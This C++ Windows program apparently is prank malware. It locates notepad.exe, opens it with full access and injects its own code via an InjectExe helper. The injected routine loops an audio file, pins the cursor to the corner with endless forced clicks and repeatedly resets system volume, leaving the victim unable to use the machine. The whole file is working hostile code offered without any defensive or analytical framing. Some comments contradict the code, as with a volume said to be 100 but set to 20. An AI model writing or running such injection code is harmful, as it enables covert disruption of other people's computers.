#include "stdafx.h"
#include <array>
#include <sstream>
#include <windows.h> 
#include <mmdeviceapi.h> 
#include <endpointvolume.h>
#include <audioclient.h>
#include <SDKDDKVer.h>
#include "InjectExe.h"
#pragma comment (lib, "winmm.lib")
#pragma data_seg("MySec")
using namespace std;

DWORD GetProcessID(char* FileName);
int RemoteMain();
bool SetVolum(int volume);

/*
    获取应用程序的PID值
*/
DWORD GetProcessID(char* FileName)
{
	HANDLE hProcess;
	PROCESSENTRY32 pe;
	BOOL bRet;
	hProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bRet = ::Process32First(hProcess, &pe);  
	while (bRet)
	{
		if (strcmp(FileName, pe.szExeFile) == 0)
			return pe.th32ProcessID;
		else
			bRet = ::Process32Next(hProcess, &pe);
	}
	return 9999;
}
/*
    注入进程之后要做的事情
*/
int RemoteMain()
{
    free(malloc(1));
    mciSendString(_T("open hsgjDJ.wma alias music"), NULL, 0, NULL);	//打开wam音频文件，因为进程注入，不确定当前目录，所以必须是绝对路径
    mciSendString(_T("play music repeat"), NULL, 0, NULL);	//循环播放
    while (true)    //死循环所有功能函数
    {
        SetCursorPos(0, 0);   //将鼠标光标放置0,0坐标
        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); //鼠标左键
        SetVolum(20);         //设置电脑音量为100
    }
    return 0;
}

/*
    设置系统音量(音量范围:0~100,音量为0时静音)
*/
bool SetVolum(int volume)
{
    bool ret = false;
    HRESULT hr;
    IMMDeviceEnumerator* pDeviceEnumerator = 0;
    IMMDevice* pDevice = 0;
    IAudioEndpointVolume* pAudioEndpointVolume = 0;
    IAudioClient* pAudioClient = 0;

    try {
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pDeviceEnumerator);
        if (FAILED(hr)) throw "CoCreateInstance";
        hr = pDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
        if (FAILED(hr)) throw "GetDefaultAudioEndpoint";
        hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudioEndpointVolume);
        if (FAILED(hr)) throw "pDevice->Active";
        hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
        if (FAILED(hr)) throw "pDevice->Active";

        float fVolume;
        fVolume = volume / 100.0f;
        hr = pAudioEndpointVolume->SetMasterVolumeLevelScalar(fVolume, &GUID_NULL);
        if (FAILED(hr)) throw "SetMasterVolumeLevelScalar";

        pAudioClient->Release();
        pAudioEndpointVolume->Release();
        pDevice->Release();
        pDeviceEnumerator->Release();

        ret = true;
    }
    catch (...) {
        if (pAudioClient) pAudioClient->Release();
        if (pAudioEndpointVolume) pAudioEndpointVolume->Release();
        if (pDevice) pDevice->Release();
        if (pDeviceEnumerator) pDeviceEnumerator->Release();
        throw;
    }
    return ret;
}

int main()
{
	// 获取指定exe程序的PID值
	char name[] = "notepad.exe";
	DWORD pid = GetProcessID(name); //获取应用程序的PID值
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);   //打开指定PID进程对象，并且获得他的进程句柄

    /*
        上面代码可以进行改进为指定进程PID注入，减少GetProcessID()步骤
    */

	// 拿到句柄进行注入并执行RemoteMain()函数
	LPVOID remoteImageBase = InjectExe(process, RemoteMain);

	return 0;
}

